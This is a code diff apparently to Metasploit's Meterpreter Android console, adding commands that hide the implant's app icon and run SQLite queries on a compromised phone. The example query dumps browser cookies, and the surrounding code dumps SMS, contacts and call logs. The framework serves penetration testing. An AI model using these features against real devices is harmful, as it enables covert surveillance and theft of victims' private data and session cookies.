@@ -31,21 +31,25 @@ class Console::CommandDispatcher::Android
       'wlan_geolocate'    => 'Get current lat-long using WLAN information',
       'interval_collect'  => 'Manage interval collection capabilities',
       'activity_start'    => 'Start an Android activity from a Uri string',
+      'hide_app_icon'     => 'Hide the app icon from the launcher',
+      'sqlite_query'      => 'Query a SQLite database from storage',
       'set_audio_mode'    => 'Set Ringer Mode'
     }
 
     reqs = {
-      'dump_sms'         => ['dump_sms'],
-      'dump_contacts'    => ['dump_contacts'],
-      'geolocate'        => ['geolocate'],
-      'dump_calllog'     => ['dump_calllog'],
-      'check_root'       => ['check_root'],
-      'device_shutdown'  => ['device_shutdown'],
-      'send_sms'         => ['send_sms'],
-      'wlan_geolocate'   => ['wlan_geolocate'],
-      'interval_collect' => ['interval_collect'],
-      'activity_start'   => ['activity_start'],
-      'set_audio_mode'   => ['set_audio_mode']
+      'dump_sms'         => ['android_dump_sms'],
+      'dump_contacts'    => ['android_dump_contacts'],
+      'geolocate'        => ['android_geolocate'],
+      'dump_calllog'     => ['android_dump_calllog'],
+      'check_root'       => ['android_check_root'],
+      'device_shutdown'  => ['android_device_shutdown'],
+      'send_sms'         => ['android_send_sms'],
+      'wlan_geolocate'   => ['android_wlan_geolocate'],
+      'interval_collect' => ['android_interval_collect'],
+      'activity_start'   => ['android_activity_start'],
+      'hide_app_icon'    => ['android_hide_app_icon'],
+      'sqlite_query'     => ['android_sqlite_query'],
+      'set_audio_mode'   => ['android_set_audio_mode']
     }
 
     # Ensure any requirements of the command are met
@@ -109,7 +113,7 @@ class Console::CommandDispatcher::Android
           header << " at #{time.strftime('%Y-%m-%d %H:%M:%S')}"
         end
 
-        table = Rex::Ui::Text::Table.new(
+        table = Rex::Text::Table.new(
           'Header'    => header,
           'SortIndex' => 0,
           'Columns'   => result[:headers],
@@ -189,7 +193,7 @@ class Console::CommandDispatcher::Android
     path = "sms_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"
     dump_sms_opts = Rex::Parser::Arguments.new(
       '-h' => [ false, 'Help Banner' ],
-      '-o' => [ false, 'Output path for sms list']
+      '-o' => [ true, 'Output path for sms list']
     )
 
     dump_sms_opts.parse(args) do |opt, _idx, val|
@@ -277,7 +281,7 @@ class Console::CommandDispatcher::Android
 
     dump_contacts_opts = Rex::Parser::Arguments.new(
       '-h' => [ false, 'Help Banner' ],
-      '-o' => [ false, 'Output path for contacts list']
+      '-o' => [ true, 'Output path for contacts list']
     )
 
     dump_contacts_opts.parse(args) do |opt, _idx, val|
@@ -381,7 +385,7 @@ class Console::CommandDispatcher::Android
     dump_calllog_opts = Rex::Parser::Arguments.new(
 
       '-h' => [ false, 'Help Banner' ],
-      '-o' => [ false, 'Output path for call log']
+      '-o' => [ true, 'Output path for call log']
 
     )
 
@@ -491,7 +495,7 @@ class Console::CommandDispatcher::Android
       end
     end
 
-    if dest.blank? || body.blank?
+    if dest.to_s.empty? || body.to_s.empty?
       print_error("You must enter both a destination address -d and the SMS text body -t")
       print_error('e.g. send_sms -d +351961234567 -t "GREETINGS PROFESSOR FALKEN."')
       print_line(send_sms_opts.usage)
@@ -543,7 +547,7 @@ class Console::CommandDispatcher::Android
       wlan_list << [mac, ssid, ss.to_s]
     end
 
-    if wlan_list.blank?
+    if wlan_list.to_s.empty?
       print_error("Unable to enumerate wireless networks from the target.  Wireless may not be present or enabled.")
       return
     end
@@ -575,6 +579,76 @@ class Console::CommandDispatcher::Android
       print_status("Intent started")
     else
       print_error("Error: #{result}")
+    end
+  end
+
+  def cmd_hide_app_icon(*args)
+    hide_app_icon_opts = Rex::Parser::Arguments.new(
+      '-h' => [ false, 'Help Banner' ]
+    )
+
+    hide_app_icon_opts.parse(args) do |opt, _idx, _val|
+      case opt
+      when '-h'
+        print_line('Usage: hide_app_icon [options]')
+        print_line('Hide the application icon from the launcher.')
+        print_line(hide_app_icon_opts.usage)
+        return
+      end
+    end
+
+    result = client.android.hide_app_icon
+    if result
+      print_status("Activity #{result} was hidden")
+    end
+  end
+
+  def cmd_sqlite_query(*args)
+    sqlite_query_opts = Rex::Parser::Arguments.new(
+      '-h' => [ false, 'Help Banner' ],
+      '-d' => [ true, 'The sqlite database file'],
+      '-q' => [ true, 'The sqlite statement to execute'],
+      '-w' => [ false, 'Open the database in writable mode (for INSERT/UPDATE statements)']
+    )
+
+    writeable = false
+    database = ''
+    query = ''
+    sqlite_query_opts.parse(args) do |opt, _idx, val|
+      case opt
+      when '-h'
+        print_line("Usage: sqlite_query -d <database_file> -q <statement>\n")
+        print_line(sqlite_query_opts.usage)
+        return
+      when '-d'
+        database = val
+      when '-q'
+        query = val
+      when '-w'
+        writeable = true
+      end
+    end
+
+    if database.blank? || query.blank?
+      print_error("You must enter both a database files and a query")
+      print_error("e.g. sqlite_query -d /data/data/com.android.browser/databases/webviewCookiesChromium.db -q 'SELECT * from cookies'")
+      print_line(sqlite_query_opts.usage)
+      return
+    end
+
+    result = client.android.sqlite_query(database, query, writeable)
+    unless writeable
+      header = "#{query} on database file #{database}"
+      table = Rex::Text::Table.new(
+        'Header'    => header,
+        'Columns'   => result[:columns],
+        'Indent'    => 0
+      )
+      result[:rows].each do |e|
+        table << e
+      end
+      print_line
+      print_line(table.to_s)
     end
   end
 
